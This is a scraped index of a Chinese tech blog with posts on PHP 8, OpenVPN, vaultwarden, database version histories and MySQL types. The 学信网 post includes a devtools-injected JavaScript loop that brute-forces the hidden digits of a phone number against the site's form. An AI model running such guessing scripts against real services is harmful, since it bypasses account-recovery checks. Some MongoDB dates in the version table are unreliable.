www.liuvv.com\n\n\n\n# 4. 参考资料\n\n+ https://www.cnblogs.com/sunhang32/p/11969964.html \n+ https://github.com/saltbo/uptoc\n+ https://www.jianshu.com/p/25766dda5a5f\n+ https://www.lixl.cn/2020/020936412.html\n+ https://developers.google.com/speed/pagespeed/insights/  测试网页加载速度\n","tags":["blog"],"categories":["博客"]},{"title":"php8.0安装和php-fpm","url":"%2Fp%2Fad42ac48.html","content":"\n# 1. 安装\n\n### 1.1  下载\n\nhttps://www.php.net/downloads  下载php-8.0.0.tar.gz\n\n<!-- more -->\n\n### 1.2 安装\n\n```bash\ntar zxvf php-8.0.0.tar.gz\n\n\nsudo apt install -y pkg-config build-essential autoconf bison re2c libxml2-dev libsqlite3-dev libssl-dev libonig-dev libpng-dev zlib1g-dev libzip-dev\n\n./configure --prefix=/usr/local/php8 --with-config-file-path=/usr/local/php8/etc --enable-fpm --enable-mysqlnd --with-mysqli=mysqlnd --with-pdo-mysql=mysqlnd --enable-mysqlnd-compression-support  --with-zlib  --enable-xml --disable-rpath --enable-bcmath --enable-shmop --enable-sysvsem  --with-curl --enable-mbregex --enable-mbstring --enable-intl   --enable-ftp  --enable-gd-jis-conv  --with-openssl --with-mhash --enable-pcntl --enable-sockets   --enable-soap --with-gettext --enable-fileinfo --enable-opcache --with-pear --without-gdbm --enable-gd --enable-exif --with-zip\n\nmake && make  install\n\n# 查看版本\n/usr/local/php8/bin/php -v \n```\n\n\n\n### 1.3 启动 php-fpm\n\n```bash\ncd /usr/local/php8/etc\ncp php-fpm.conf.default  php-fpm.conf\nvi php-fpm.conf   \n去掉# pid = run/php-fpm.pid 前面的注释\n\n\ncd /usr/local/php8/etc/php-fpm.d\ncp www.conf.default  www.conf\n\n\n# 测试\n/usr/local/php8/sbin/php-fpm -t\n\n# 启动\n/usr/local/php8/sbin/php-fpm  # 报错 cannot get gid for group 'nobody'\ngroupadd nobody # 增加组即可\n```\n\n\n\n### 1.4 配置\n\n+ nginx 配置\n\n` vi /etc/nginx/sites-enabled/php.conf`\n\n```nginx\nserver {\n        listen          80; \n        server_name  php.liuvv.com;\n        root   /var/www/html/php;\n        index  index.html index.htm index.php;\n\n        location ~ \\.php {\n                fastcgi_pass   127.0.0.1:9000;\n                fastcgi_index  index.php;\n                fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;\n#               fastcgi_split_path_info ^(.+\\.php)(/.*)$;\n#               fastcgi_param PATH_INFO $fastcgi_path_info;\n                include        fastcgi_params;\n        }   \n}\n```\n\n+ 增加 php 文件\n\n```bash\n mkdir /var/www/html/php\n vi /var/www/html/php/index.php\n <? phpinfo();\n```\n\n### 1.5 systemctl 服务\n\n`vi /usr/lib/systemd/system/php-fpm.service`\n\n```bash\n[Unit]\nDescription=The PHP FastCGI Process Manager\nAfter=syslog.target network.target\n\n[Service]\nType=forking\nPIDFile=/usr/local/php/var/run/php-fpm.pid\nExecStart=/usr/local/php/sbin/php-fpm\nExecReload=/bin/kill -USR2 $MAINPID\nPrivateTmp=true\n\n[Install]\nWantedBy=multi-user.target\n```\n\n启动服务\n\n```bash\nsystemctl daemon-reload\nsystemctl start php-fpm\n```\n\n\n\n# 2. fastcgi和php-fpm\n\n### 2.1 CGI协议\n\nCGI全称是“公共网关接口”(Common Gateway Interface)，HTTP服务器与你的或其它机器上的程序进行“交谈”的一种工具，其程序须运行在网络服务器上。\n\nCGI可以用任何一种语言编写，只要这种语言具有标准输入、输出和环境变量。如php,perl,tcl等。\n\n当Nginx收到`/index.php`这个请求后，会启动对应的CGI程序，这里就是PHP的解析器。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定CGI规定的格式返回处理后的结果，退出进程。web server再把结果返回给浏览器。\n\n\n\n### 2.2 FastCGI协议\n\nFastCGI像是一个常驻(long-live)型的CGI，它可以一直执行着，只要激活后，不会每次都要花费时间去fork一次（这是CGI最为人诟病的fork-and-execute 模式）。它还支持分布式的运算，即 FastCGI 程序可以在网站服务器以外的主机上执行并且接受来自其它网站服务器来的请求。\n\nFastCGI是语言无关的、可伸缩架构的CGI开放扩展，其主要行为是将CGI解释器进程保持在内存中并因此获得较高的性能。众所周知，CGI解释器的反复加载是CGI性能低下的主要原因，如果CGI解释器保持在内存中并接受FastCGI进程管理器调度，则可以提供良好的性能、伸缩性、Fail- Over特性等等。\n\n\n\nFastCGI的特点是会在一个进程中依次完成多个请求，以达到提高效率的目的，大多数FastCGI实现都会维护一个进程池。\n\n\n\n### 2.3 PHP-CGI解释器\n\nPHP-CGI是PHP自带的FastCGI管理器。\n\nPHP-CGI的不足：\n\n1. php-cgi变更php.ini配置后需重启php-cgi才能让新的php-ini生效，不可以平滑重启。\n2. 直接杀死php-cgi进程，php就不能运行了。\n\nPHP-CGI只是个CGI程序，他自己本身只能解析请求，返回结果，不会进程管理。所以就出现了一些能够调度 php-cgi 进程的程序，比如说由lighthttpd分离出来的spawn-fcgi。同样，PHP-FPM也是用于调度管理PHP解析器php-cgi的管理程序。\n\n\n\n### 2.4 PHP-FPM调度PHP-CGI\n\nPHP的解释器是php-cgi。php-cgi只是个CGI程序，他自己本身只能解析请求，返回结果，不会进程管理（皇上，臣妾真的做不到啊！）\n\n所以就出现了一些能够调度php-cgi进程的程序，比如说由lighthttpd分离出来的spawn-fcgi。PHP-FPM也是用于调度管理PHP解析器php-cgi的管理程序。\n\n\n\n### 2.5 问题回答\n\n+ fastcgi是一个协议，php-fpm实现了这个协议； \n\n  对。\n\n+ 有的说，php-fpm是fastcgi进程的管理器，用来管理fastcgi进程的； \n\n  对。\n\n  php-fpm的管理对象是php-cgi。但不能说php-fpm是fastcgi进程的管理器，fastcgi是个协议，似乎没有这么个进程存在，就算存在php-fpm也管理不了他（至少目前是）。\n\n+ 有的说，php-fpm是php内核的一个补丁; \n\n  以前是对的。\n\n  因为最开始的时候php-fpm没有包含在PHP内核里面，要使用这个功能，需要找到与源码版本相同的php-fpm对内核打补丁，然后再编译。后来PHP内核集成了PHP-FPM之后就方便多了，使用--enalbe-fpm这个编译参数即可。\n\n+ 有的说，修改了php.ini配置文件后，没办法平滑重启，所以就诞生了php-fpm； \n\n  是的。\n  修改php.ini之后，php-cgi进程的确是没办法平滑重启的。php-fpm对此的处理机制是新的worker用新的配置，已经存在的worker处理完手上的活就可以歇着了，通过这种机制来平滑过度。\n\n+ 还有的说php-cgi是PHP自带的FastCGI管理器，那这样的话干吗又弄个php-fpm出来；\n\n  php-cgi与php-fpm一样，也是一个fastcgi进程管理器\n\n  php-cgi的问题在于 1、php-cgi变更php.ini配置后需重启php-cgi才能让新的php-ini生效，不可以平滑重启 2、直接杀死php-cgi进程,php就不能运行了。(PHP-FPM和Spawn-FCGI就没有这个问题,守护进程会平滑从新生成新的子进程。） 针对php-cgi的不足，php-fpm应运而生。\n\n\n\n# 3. 参考资料\n\n+ https://www.jianshu.com/p/7627c794b272\n+ https://segmentfault.com/q/1010000000256516\n+ https://huaien.co/technology/no-enough-memory-to-make-php/ (编译时内存不足的问题)\n\n","tags":["php"],"categories":["php"]},{"title":"openvpn搭建虚拟局域网","url":"%2Fp%2Fa84d9911.html","content":"\n### 0. 前言\n\nOpenVPN 是一个健壮的、高度灵活的 [VPN](https://en.wikipedia.org/wiki/VPN) 守护进程。它支持 [SSL/TLS](https://en.wikipedia.org/wiki/SSL/TLS) 安全、[Ethernet bridging](https://en.wikipedia.org/wiki/Bridging_(networking))、经由[代理](https://en.wikipedia.org/wiki/Proxy_server)的 [TCP](https://en.wikipedia.org/wiki/Transmission_Control_Protocol) 或 [UDP](https://en.wikipedia.org/wiki/User_Datagram_Protocol) [隧道](https://en.wikipedia.org/wiki/Tunneling_protocol)和 [NAT](https://en.wikipedia.org/wiki/Network_address_translation)。另外，它也支持动态 IP 地址以及 [DHCP](https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol)，可伸缩性足以支持数百或数千用户的使用场景，同时可移植至大多数主流操作系统平台上。\n\n##### 安装openvpn\n\n```bash\nsudo apt install openvpn\n```\n\n<!-- more -->\n\n### 1. 生成证书\n\n```bash\ngit clone https://github.com/OpenVPN/easy-rsa\ncd easyrsa3\n```\n\n\n\n##### 1.1 生成 CA\n\n```bash\n./easyrsa init-pki\n\n./easyrsa build-ca  \n# 输入密码: 123456\nCommon Name: OpenVPN-CA\n```\n\npki文件夹下会生成 ca.crt\n\n\n\n##### 1.2 生成server和 client 公钥私钥对\n\n```bash\n./easyrsa build-server-full server\n\n./easyrsa build-client-full client1\n./easyrsa build-client-full client2\n./easyrsa build-client-full client3\n```\n\npki/private 是私有的 key\n\npki/issued 是公有的 key\n\n\n\n##### 1.3 生成Diffie-Hellman pem \n\n```bash\n./easyrsa gen-dh\n```\n\npki 文件夹下生成了 dh.pem\n\n\n\n##### 1.4 现在我们有了\n\n| **Filename** | **Needed By**            | **Purpose**               | **Secret** |\n| ------------ | ------------------------ | ------------------------- | ---------- |\n| ca.crt       | server + all clients     | Root CA certificate       | NO         |\n| ca.key       | key signing machine only | Root CA key               | YES        |\n| dh{n}.pem    | server only              | Diffie Hellman parameters | NO         |\n| server.crt   | server only              | Server Certificate        | NO         |\n| server.key   | server only              | Server Key                | YES        |\n| client1.crt  | client1 only             | Client1 Certificate       | NO         |\n| client1.key  | client1 only             | Client1 Key               | YES        |\n| client2.crt  | client2 only             | Client2 Certificate       | NO         |\n| client2.key  | client2 only             | Client2 Key               | YES        |\n| client3.crt  | client3 only             | Client3 Certificate       | NO         |\n| client3.key  | client3 only             | Client3 Key               | YES        |\n\n\n\n### 2. 配置文件\n\n在安装目录下(`/usr/share/doc/openvpn/examples/sample-config-files`)找到配置 `server.conf` and `client.conf`\n\n如果只有有 server.conf.gz 的话, 需要解压\n\n```bash\ngunzip -c server.conf.gz > server.conf\n```\n\n\n\n##### 2.1  服务端修改证书路径\n\nBefore you use the sample configuration file, you should first edit the **ca**, **cert**, **key**, and **dh** parameters to point to the files you generated in the [PKI](https://openvpn.net/community-resources/how-to/#setting-up-your-own-certificate-authority-ca-and-generating-certificates-and-keys-for-an-openvpn-server-and-multiple-clients) section above.\n\n##### 2.2 服务端dev 模式可以修改  tap tun\n\n##### 2.3 服务端修改 ip 范围\n\nIf you want to use a virtual IP address range other than `10.8.0.0/24`, you should modify the `server` directive. Remember that this virtual IP address range should be a private range which is currently unused on your network.\n\n\n\nThe Internet Assigned Numbers Authority (IANA) has reserved the following three blocks of the IP address space for private internets (codified in RFC 1918):\n\n| 10.0.0.0    | 10.255.255.255  | (10/8 prefix)       |\n| ----------- | --------------- | ------------------- |\n| 172.16.0.0  | 172.31.255.255  | (172.16/12 prefix)  |\n| 192.168.0.0 | 192.168.255.255 | (192.168/16 prefix) |\n\nThe best candidates are subnets in the middle of the vast 10.0.0.0/8 netblock (for example 10.66.77.0/24).\n\n\n\n##### 2.4 服务端修改 client 之间可连接\n\nUncomment out the `client-to-client` directive if you would like connecting clients to be able to reach each other over the VPN. By default, clients will only be able to reach the server.\n\n##### 2.5 服务端修改 user 和 group\n\nIf you are using Linux, BSD, or a Unix-like OS, you can improve security by uncommenting out the **user nobody** and **group nobody** directives.\n\n##### 2.6 客户端修改证书路径\n\n`ca`, `cert`, `key`\n\n##### 2.7 客户端修改 remote 参数\n\n```bash\nremote my-server-1 1194\n```\n\n\n\n##### 2.8 服务器和客户端的 `dev` (tun or tap) and `proto` (udp or tcp) 要一致\n\n\n\n### 3. 启动使用\n\n##### 3.1 启动 server\n\n```bash\nsudo openvpn /etc/openvpn/server.conf\n```\n\n成功启动以后会发现多了一个 tun 网口\n\n\n\n如遇到错误: [Open VPN options error: --tls-auth fails with 'ta.key': no such file or directory](https://unix.stackexchange.com/questions/359428/open-vpn-options-error-tls-auth-fails-with-ta-key-no-such-file-or-director)\n\n```bash\nsudo openvpn --genkey --secret /etc/openvpn/certs/ta.key\n```\n\n\n\n##### 3.2 启动 client\n\n``` bash\nsudo openvpn /etc/openvpn/client.conf\n```\n\n\n\n如遇到错误: Authenticate/Decrypt packet error: packet HMAC authentication failed, 配置文件里,\n\n```bash\ntls-auth /etc/openvpn/certs/ta.key 0  #服务器用0\n\ntls-auth /etc/openvpn/certs/ta.key 1  #客户端用1\n```\n\n注意, 这个 key 是同一个, 在服务器生成, 不是每个都生成一次\n\n\n\n##### 3.3 测试\n\n在客户端  `ping 10.8.0.1`\n\nIf the ping succeeds, congratulations! You now have a functioning VPN.\n\n我们也可以 `ssh user@10.8.0.1` 发现也可以\n\n\n\n##### 3.4 mac 使用\n\nhttps://tunnelblick.net/ 下载安装包\n\n可以生成.ovpn 文件, 参考https://serverfault.com/a/483967\n\n\n\n### 4. openvpn服务\n\n##### 4.1 server service\n\n```bash\nsudo systemctl start openvpn@server.service\n\nsudo systemctl enable openvpn@server.service\n```\n\n需要输入密码请这样\n\n```bash\nsudo systemd-tty-ask-password-agent \n```\n\n\n\n##### 4.2 client service\n\n```bash\nsudo systemctl start openvpn@client.service\n\nsudo systemctl enable openvpn@client.service\n```\n\n\n\n### 5. 客户端分配固定 IP\n\n```bash\ncd /etc/openvpn\nmkdir ccd\n\n# 配置文件修改client-config-dir\nvim server.conf\nclient-config-dir ccd\n\n#在ccd文件夹下建立以用户名(Common Name)为名称的文件\ncd ccd\n\nvi client1\nifconfig-push 10.8.0.2 255.255.255.0\n\nvi client2\nifconfig-push 10.8.0.3 255.255.255.0\n```\n\n\n\n### 6. 参考资料\n\n+ https://openvpn.net/community-resources/how-to/\n\n+ https://github.com/OpenVPN/easy-rsa\n\n+ https://tunnelblick.net/\n\n+ https://community.openvpn.net/openvpn/wiki/Concepts-Addressing","tags":["openvpn"],"categories":["软件"]},{"title":"bitwardon密码管理免费安装使用","url":"%2Fp%2F8e14412f.html","content":"\n为什么写这篇文章，因为1Password实在是太贵了。Bitwarden自建密码存储系统确实可以完美替代1Password等付费的密码管理服务，另外 vaultwarden 支持官方付费才能实现的服务。\n\n<!-- more -->\n\n# 1.安装使用\n\n### 1.1 准备\n\n首先把自己的域名解析到服务器上，因为用caddy，不用自己去申请证书就可以https。\n\n<img src=\"bitwardon密码管理免费安装使用/1.png\" alt=\"image-20220127145830908\" style=\"zoom:50%;\" />\n\n\n\n### 1.2 安装\n\n```bash\napt install docker-compose \n```\n\n创建两个文件。\n\n+ vi docker-compose.yml\n\n  ```yml\n  version: '3'\n\n  services:\n          vaultwarden:\n                  image: vaultwarden/server:latest\n                  container_name: vaultwarden\n                  restart: always\n                  environment:\n                          - WEBSOCKET_ENABLED=true  # Enable WebSocket notifications.\n                  volumes:\n                          - ./vw-data:/data\n\n          caddy:\n                  image: caddy:2\n                  container_name: caddy\n                  restart: always\n                  ports:\n                          - 6666:80  # Needed for the ACME HTTP-01 challenge.\n                          - 443:443\n                  volumes:\n                          - ./Caddyfile:/etc/caddy/Caddyfile:ro\n                          - ./caddy-config:/config\n                          - ./caddy-data:/data\n                  environment:\n                          - DOMAIN=https://mima.liuvv.com  # Your domain.\n                          - EMAIL=levonfly@gmail.com                # The email address to use for ACME registration.\n                          - LOG_FILE=/data/access.log\n\n  ```\n\n+ vi Caddyfile\n\n  ```yml\n  {$DOMAIN}:443 {\n    log {\n      level INFO\n      output file {$LOG_FILE} {\n        roll_size 10MB\n        roll_keep 10\n      }\n    }\n  \n    # Use the ACME HTTP-01 challenge to get a cert for the configured domain.\n    tls {$EMAIL}\n  \n    # This setting may have compatibility issues with some browsers\n    # (e.g., attachment downloading on Firefox). Try disabling this\n    # if you encounter issues.\n    encode gzip\n  \n    # Notifications redirected to the WebSocket server\n    reverse_proxy /notifications/hub vaultwarden:3012\n  \n    # Proxy everything else to Rocket\n    reverse_proxy vaultwarden:80 {\n         # Send the true remote IP to Rocket, so that vaultwarden can put this in the\n         # log, so that fail2ban can ban the correct IP.\n         header_up X-Real-IP {remote_host}\n    }\n  }\n  \n  ```\n\n+ 启动和退出\n\n```bash\ndocker-compose up -d\ndocker-compose down\n```\n\n\n\n### 1.3 使用\n\n在网页，手机，桌面版，点击设置的齿轮，就可以输入自己的服务器URL，注册一个账号，登录即可。\n\n<img src=\"bitwardon密码管理免费安装使用/2.png\" alt=\"image-20220127145009101\" style=\"zoom: 50%;\" />\n\n# 2. 移植\n\n+ 安装走一遍\n+ 域名解析换掉\n+ 拷贝vm-data下的 `dq.sqlite3`  和 `icon_cace`\n+ 重启docker\n\n\n\n# 3. 备份\n\n自动备份到dropbox失败，因为部署的小破服务器无法翻Q。\n\n\n\n# 4. 参考资料\n\n+ https://github.com/dani-garcia/vaultwarden/wiki/Using-Docker-Compose\n+ https://wzfou.com/bitwarden-mima/\n+ https://www.moec.top/archives/285","tags":["密码"],"categories":["软件"]},{"title":"mac设置默认输入法","url":"%2Fp%2F88c7abb.html","content":"\n中文输入法作为首选输入法, 简单一步, 却能让你使用 macOS 的幸福感提升一大截。\n\n<!-- more -->\n\n### 1. 设置第三方输入法在第一位\n\n系统偏好→语言与地区→首选语言（选择中文）→成功（搜狗就排第一了）\n\n当然这里的前提是把系统自带的英文输入法去掉。\n\n做法就是，系统偏好设置→输入法→➕号添加 威尔士🏴󠁧󠁢󠁷󠁬󠁳󠁿 →选中系统自带英文，➖号→成功。\n\n\n\n### 2. 自动切换输入法(推荐)\n\nAPPStore 搜索自动切换输入法, 下载使用即可\n\n在自动切换输入法内，提前设置每个App对应的输入法，切换至该App时，将为您自动切换至为他设定好的输入法。\n\n对切换重度用户，自动切换将为您减少95%以上的手动切换次数，大幅提升输入体验。\n\n\n\n### 3. 参考资料\n\n+ https://www.zhihu.com/question/21466262\n+ https://www.better365.cn/AutoSwitchInput.html\n+ https://github.com/utatti/kawa\n","tags":["mac"],"categories":["使用"]},{"title":"数据库历史版本介绍","url":"%2Fp%2Fdb4b5549.html","content":"\n# 1. mysql\n\n| 版本   | 事件                                                         | 时间       | New                                                         |\n| ------ | ------------------------------------------------------------ | ---------- | ----------------------------------------------------------- |\n| 1.0    |1995       | 仅供内部使用                                                 |                                                              |\n| 3.11.1 |1996       |       First release                                                |                                                        |\n| 4.0    | 2002       |   查询缓存，联合，全文，InnoDB                                 |                                                           |\n| 5.0    | 2005       |        存储的Routies，视图，游标，触发器，XA事务，I_S               |                                                      |\n| 5.1    |2008-11-14 | 事件调度程序，分类，插件API，RBR，InnoDB插件，MySQL群集      |                                                              |\n| 5.5    |2010-12-03 |  InnoDB代替MyISAM成为MySQL默认的存储引擎。                    |                                                             |\n| 5.6    | 2013-02-05 | 在线DDL，GTID，并行复制，ICP，MRR......MySQL 5.6是MySQL历史上一个里程碑式的版本，这也是目前生产上应用得最广泛的版本。 | https://dev.mysql.com/doc/refman/5.6/en/mysql-nutshell.html |\n| 5.7    | 2015-10-21 |组复制,InnoDB Cluster,多源复制, JSON支持                     |  https://dev.mysql.com/doc/refman/5.7/en/mysql-nutshell.html |\n| 8.0    |2018-04-19 | 不可见索引,降序索引                                          |  https://dev.mysql.com/doc/refman/8.0/en/mysql-nutshell.html |\n\n<!-- more -->\n\n# 2. pgsql\n| 版本   | 时间                                                       | 事件 |\n| :----- | :----------------------------------------------------------: | :--: |\n| 6.0 | 1997-01-29|PostgreSQL首次发行即选择6.0作为其版本号，唯一索引，pg_dumpall实用程序，身份验证 |\n| 8.0 | 2005-01-19|Microsoft Windows上的本机服务器，保存点，表空间，时间点恢复 |\n| 9.2 | 2012-09-10|级联流复制，仅索引扫描，本机JSON支持，改进的锁管理，范围类型，pg_receivexlog工具，空间分区的GiST索引 |\n| 9.4 | 2014-12-18 |JSONB数据类型，用于更改配置值的ALTER SYSTEM语句，无需阻塞读取即可刷新实例化视图的功能，后台工作进程的动态注册/启动/停止，逻辑解码API，GiN索引改进，Linux大页面支持，通过pg_prewarm重新加载数据库缓存 ，将Hstore重新引入为文档样式数据的选择列类型。 |\n| 9.6 |2016-09-29| 并行查询支持，PostgreSQL外部数据包装器（FDW）的改进（通过排序/联接下推），多个同步备用数据库，更快的大表清理 |\n| 10 | 2017-10-05|逻辑复制，声明性表分区，改进的查询并行性 |\n| 11 |2018-10-18| 增强了分区的健壮性和性能，存储过程中支持的事务，增强的查询并行性功能，表达式的实时（JIT）编译 |\n| 12 | 2019-10-03|改进查询性能和空间利用率； SQL / JSON路径表达式支持； 生成的列； 改善国际化和认证； 新的可插入表存储接口。 |\n| 13 |2020-09-24| B树索引条目的重复数据删除节省了空间并提高了性能，改进了使用聚合或分区表的查询的性能，使用扩展统计信息时更好的查询计划，索引的并行清理，增量排序。 |\n\n\n\n# 3. redis\n\n| 版本 | 时间           | 事件                                                         |\n| ---- | -------------- | ------------------------------------------------------------ |\n| 2.6  | 2012年         | 服务端支持Lua脚本。                                          |\n| 2.8  | 2013年11月22日 | 发布订阅添加了pubsub命令,slave支持从master部分同步           |\n| 3.0  | 2015年4月1日   | Redis Cluster：Redis的官方分布式实现。                       |\n| 3.2  | 2016年5月6日   | 新的List编码类型：quicklist,新的RDB格式。                    |\n| 4.0  | 2017年7月14日  | PSYNC2.0：优化了之前版本中，主从节点切换必然引起全量复制的问题。<br/>提供了RDB-AOF混合持久化格式，充分利用了AOF和RDB各自优势。 |\n| 5.0  | 2018年10月     | 新的流数据类型(Stream data type)                             |\n| 6.0  | 2020 年5月2日  | 多线程                                                       |\n\n\n\n# 4. mongodb\n\n| 版本  | 时间          | 事件                                                   |\n| ----- | ------------- | ------------------------------------------------------ |\n| 1.0   | 2009          | 首次在数据库领域亮相，打破了关系型数据库一统天下的局面 |\n| 2.0.6 | 2012          |                                                        |\n| 2.4.8 | 2013          |                                                        |\n| 3.0.1 | 2017          |                                                        |\n| 4.0.2 | 2018          | 支持多文档事务                                         |\n| 5.0   | 2019          | 引入分布式事务                                         |\n\n\n\n# 5. 参考资料\n\n+ https://en.wikipedia.org/wiki/MySQL\n+ https://en.wikipedia.org/wiki/PostgreSQL","tags":["sql"],"categories":["数据库"]},{"title":"学信网注册手机号码忘记了改绑手机","url":"%2Fp%2Fc27fdcd6.html","content":"\n\n登录学信网, 发现手机号还是大学时候用的手机号,  号码都忘记了, 改绑现在的手机还需要必填以前的手机号. \n\n之前的手机号中间四位是`****`, 所以一共有10000种可能.\n\n<!-- more -->\n\n# 1. 解决方案\n\n\n\n### 1.1 暴力破解\n\n每日验证码次数有限, 不建议.\n\n\n\n### 1.2 获取手机号信息(最有效)\n\n1，用你学信网的账号登录 阳光高考 https://gaokao.chsi.com.cn/\n\n2，点击右边 特殊类型招生入口  \n\n3，点击右边 报名登录 进去随便选择一个，如：高水平运动员  艺术类\n\n4，进入报名，同意条款，确认身份证，到个人信息的时候就能看见电话号码了。\n\n\n\n### 1.3 技术方案\n\n学信网通过加密方式显示手机号，隐藏了原来手机号的中间4位，修改手机号的时候需要提供原来手机号，并且需要新手机号接收一个验证码，幸运的是这个验证码是24小时内有效，所以可以使用暴力破解的方式，每2秒钟尝试一个电话号码，最多会尝试10000次，也就是说最长时间需要耗时20000秒（大约5个半小时），不过一般不会那么点背，尝试到9999的时候才修改成功。当然这个不可能人工去完成破解，需要写代码。\n\n虽然我在中途测试中放弃了, 但是致敬这位大佬.  参考: http://www.jsunw.com/?post=36\n\n1. 通过firefox或者chrome打开手机号编辑页面，首先随便输入一个原手机号，修改一次，主要是为了拿到验证码\n2. 打开控制台，定位至“确定”按钮\n3. 右键这个`<input>`标签，编辑html代码，在这个`<input>`标签后面添加下面代码：\n\n```html\n<input type=\"button\" value=\"start\" onclick=\"(function (btn, form, input, start, iframeName, speed) {if (!form.attr('target')) {$('<iframe></iframe>').attr('name', iframeName).insertBefore(form.attr('target', iframeName));}if (window.jsunw == null) {input.val(start);}if (window.jsunw) {clearInterval(window.jsunw);window.jsunw = 0;btn.val('go on').attr('title', 'start');} else {window.jsunw = setInterval(function () {if (parseInt(input.val().replace(/(\\d{3})\\d{4}(\\d{4})/g, '$10000$2')) != start) {input.val(start);}var v = parseInt(input.val());v = v > (start + 99990000) ? start : v + 10000;input.val(v);}, speed);btn.val('working...').attr('title', 'pause');}})($(this), $(this).closest('form'), $(this).closest('tbody').find('[name=oldMobilePhone]'), parseInt($(this).closest('#setPhone').find('>strong').text().replace(/\\*/g, '0')), 'setPhoneTarget', 2000);\">\n```\n\n如下图:\n\n![1](http://www.jsunw.com/content/uploadfile/201806/eabe1529569128.png)\n\n4. 在页面中单击新添加的这个按钮后，查看“原手机号”对应的输入框，里面的手机号应该每隔两秒自动改变一次，这就说明破解脚本正在执行。\n\n5. 保持这个页面不要动，等待一段时间，另外打开一个页面查看手机号是否已经修改，如果修改成功，那就恭喜你了，这时候就可以关闭这个脚本页面了。\n\n\n\n# 2. 参考资料\n\n+ https://zhidao.baidu.com/question/585034076726360365.html\n+ http://www.jsunw.com/?post=36","tags":["学信网"],"categories":["个人记录"]},{"title":"mysql基础知识","url":"%2Fp%2Fab5fc61f.html","content":"\n\n# 1. mysql 数值数据类型\n\nMySQL支持所有标准的SQL数值数据类型。这些类型包括精确的数字数据类型（INTEGER、SMALLINT、DECIMAL和NUMERIC，以及近似数字数据类型（FLOAT、REAL和DOUBLE PRECISION）。\n\n+ INT是INTEGER的同义词。\n\n+ DEC, FIXED, NUMERIC是DECIMAL的同义词。\n\n+ DOUBLE视为DOUBLE PRECISION（非标准扩展）的同义词。\n\n+ REAL视为DOUBLE PRECISION（非标准变体）的同义词，除非启用REAL_AS_FLOAT SQL模式。\n\n从MySQL8.0.17开始，ZEROFILL属性不推荐用于数值数据类型，在未来的MySQL版本中，对它的支持将被删除。\n\n<!-- more -->\n\n### 1.1 整数\n\n对于整数数据类型，M表示最大显示宽度。最大显示宽度为255。显示宽度与类型可以存储的值范围无关。\n\n| Type      | Storage (Bytes) | Minimum Value Signed | Minimum Value Unsigned | Maximum Value Signed | Maximum Value Unsigned |\n| --------- | --------------- | -------------------- | ---------------------- | -------------------- | ---------------------- |\n| TINYINT   | 1               | -128                 | 0                      | 127                  | 255                    |\n| SMALLINT  | 2               | -32768               | 0                      | 32767                | 65535                  |\n| MEDIUMINT | 3               | -8388608             | 0                      | 8388607              | 16777215               |\n| INT       | 4               | -2147483648          | 0                      | 2147483647           | 4294967295             |\n| BIGINT    | 8               | -2^63                | 0                      | 2^63 -1              | 2^64 -1                |\n\n+ [TINYINT[(**M**)\\] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/integer-types.html)\n\nA very small integer. The signed range is -128 to 127. The unsigned range is 0 to 255.\n\n\n\n+ [BOOL](https://dev.mysql.com/doc/refman/8.0/en/integer-types.html), [BOOLEAN](https://dev.mysql.com/doc/refman/8.0/en/integer-types.html)\n\nThese types are synonyms for [TINYINT(1)](https://dev.mysql.com/doc/refman/8.0/en/integer-types.html). A value of zero is considered false. Nonzero values are considered true\n\n\n\n+ [SMALLINT[(**M**)\\] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/integer-types.html)\n\nA small integer. The signed range is -32768 to 32767. The unsigned range is 0 to 65535.\n\n\n\n+ [MEDIUMINT[(**M**)\\] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/integer-types.html)\n\nA medium-sized integer. The signed range is -8388608 to 8388607. The unsigned range is 0 to 16777215.\n\n\n\n+ [INT[(**M**)\\] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/integer-types.html)\n\n  [INTEGER[(**M**)\\] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/integer-types.html)\n\nA normal-size integer. The signed range is -2147483648 to 2147483647. The unsigned range is 0 to 4294967295.\n\n\n\n+ [BIGINT[(**M**)\\] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/integer-types.html)\n\nA large integer. The signed range is -9223372036854775808 to 9223372036854775807. The unsigned range is 0 to 18446744073709551615.\n\n\n\n### 1.2 小数\n\n对于浮点和定点数据类型，M是可存储的总位数。\n\n+ 第一类\n\n[DECIMAL[(**M**[,**D**\\])] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/fixed-point-types.html)\n\n[DEC[(**M**[,**D**\\])] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/fixed-point-types.html)\n\n[NUMERIC[(**M**[,**D**\\])] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/fixed-point-types.html)\n\n[FIXED[(**M**[,**D**\\])] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/fixed-point-types.html)\n\n\n\nM是总位数（精度），D是小数点后的位数（刻度）。十进制的最大位数（M）为65。支持的最大小数位数（D）为30。\n\n如果省略M，默认值为10。如果省略D，默认值为0。\n\n小数点和（对于负数）符号不计算在M中。如果D为0，则值没有小数点或小数部分。\n\n从MySQL 8.0.17开始，DECIMAL类型的列（以及任何同义词）都不推荐使用UNSIGNED属性，在将来的MySQL版本中，将删除对它的支持。\n\n\n\n+ 第二类\n\n[FLOAT[(**M**,**D**)\\] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/floating-point-types.html)\n\n\n\nM是总位数，D是小数点后的位数。如果省略M和D，则值存储在硬件允许的范围内。单精度浮点数精确到小数点后7位左右。\n\nFLOAT（M，D）是一个非标准的MySQL扩展。从MySQL 8.0.17开始，不推荐使用这种语法，在将来的MySQL版本中将删除对它的支持。\n\n\n\n+ 第三类\n\n[DOUBLE[(**M**,**D**)\\] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/floating-point-types.html)\n\n[DOUBLE PRECISION[(**M**,**D**)\\] [UNSIGNED] 